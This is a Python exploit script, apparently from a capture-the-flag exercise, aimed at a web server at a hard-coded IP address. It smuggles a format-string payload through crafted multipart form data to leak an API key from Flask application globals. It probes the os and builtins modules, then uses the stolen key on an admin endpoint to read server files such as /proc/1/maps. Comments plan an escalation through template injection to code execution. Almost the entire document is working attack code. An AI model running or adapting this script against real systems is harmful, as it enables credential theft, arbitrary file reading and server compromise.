import httpx
import re

TARGET = "http://223.6.249.127:36894"
BOUNDARY = "---------------------------FlagBoundary123"

def get_api_key():
    fmt_payload = "{0.view_functions[action].__globals__[API_KEY]}"
    fake_action_part = (
        f'\r\n--{BOUNDARY}\r\n'
        f'Content-Disposition: form-data; name="action"; filename="action"\r\n'
        f'Content-Type: text/json\r\n\r\n'
        f'{{"type": "debug"}}\r\n'
    )
    text = fmt_payload + fake_action_part
    params = {'text': text, 'client': 'Content-Type', 'token': f'multipart/form-data; boundary={BOUNDARY}'}
    r = httpx.post(f'{TARGET}/heartbeat', data=params, timeout=10.0)
    return r.text.strip()

def debug_format(payload):
    fake_action_part = (
        f'\r\n--{BOUNDARY}\r\n'
        f'Content-Disposition: form-data; name="action"; filename="action"\r\n'
        f'Content-Type: text/json\r\n\r\n'
        f'{{"type": "debug"}}\r\n'
    )
    text = payload + fake_action_part
    print(f"[*] Payload length: {len(text)} (max 300)")
    
    params = {'text': text, 'client': 'Content-Type', 'token': f'multipart/form-data; boundary={BOUNDARY}'}
    try:
        r = httpx.post(f'{TARGET}/heartbeat', data=params, timeout=15.0)
        return r.text
    except Exception as e:
        return f"Error: {e}"

def read_file_via_admin(api_key, path):
    headers = {"Authorization": api_key}
    try:
        r = httpx.get(f"{TARGET}/admin", params={"tmpl": path}, headers=headers, timeout=10.0)
        return r.text, r.status_code
    except Exception as e:
        return f"Error: {e}", 0

if __name__ == "__main__":
    api_key = get_api_key()
    print(f"[+] API_KEY: {api_key}")
    
    # The admin endpoint has render_template_string which is SSTI
    # If we can find a file that contains Jinja2 syntax, we can execute code
    # Let's try to write to /tmp via os.system or os.popen
    
    # First check os.name
    print("\n[*] Try os.name...")
    result = debug_format("{0.view_functions[action].__globals__[os].name}")
    print(result[:200])
    
    # Try os.sep
    print("\n[*] Try os.sep...")
    result = debug_format("{0.view_functions[action].__globals__[os].sep}")
    print(result[:200])
    
    # Try to read a file by using open 
    # Since __builtins__ is a module, we need to access it differently
    print("\n[*] Try __builtins__.open...")
    result = debug_format("{0.view_functions[action].__globals__[__builtins__].open}")
    print(result[:200])
    
    # Let me try to use the json module's __builtins__
    print("\n[*] Try json.__builtins__...")
    result = debug_format("{0.view_functions[action].__globals__[json].__builtins__}")
    print(result[:300])
    
    # Try scanning directories using /proc filesystem
    # Many proc files might give us hints
    print("\n[*] Reading /proc/1/exe (symlink to executable)...")
    content, code = read_file_via_admin(api_key, "/proc/1/exe")
    print(f"Status: {code}")
    
    print("\n[*] Reading /proc/1/maps...")
    content, code = read_file_via_admin(api_key, "/proc/1/maps")
    print(content[:500] if code == 200 else f"Failed: {code}")
